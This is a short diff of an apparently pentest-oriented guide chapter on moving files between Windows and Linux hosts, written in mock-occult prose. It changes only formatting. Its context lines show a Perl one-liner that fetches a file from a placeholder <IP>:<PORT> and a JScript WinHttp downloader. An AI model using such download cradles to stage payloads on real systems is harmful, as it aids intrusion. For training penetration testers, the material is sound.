@@ -2,7 +2,7 @@
 
 In the profane rites of assessment, the movement of relics—scripts, payloads, and binaries—is both necessary and perilous. This chapter reveals methods for casting files across dimensions, utilizing primitive yet persistent protocols shared among ancient systems both Windows and Linux.
 
-> *"No summoning may begin until the runes are in place."*
+> _"No summoning may begin until the runes are in place."_
 
 ---
 
@@ -1477,7 +1477,7 @@ perl -e 'use LWP::Simple; getstore("http://<IP>:<PORT>/<FILE>", "<OUTPUT FILE>")
 
 ```javascript
 var WinHttpReq = new ActiveXObject("WinHttp.WinHttpRequest.5.1");
-WinHttpReq.Open("GET", WScript.Arguments(0), /*async=*/false);
+WinHttpReq.Open("GET", WScript.Arguments(0), /*async=*/ false);
 WinHttpReq.Send();
 BinStream = new ActiveXObject("ADODB.Stream");
 BinStream.Type = 1;
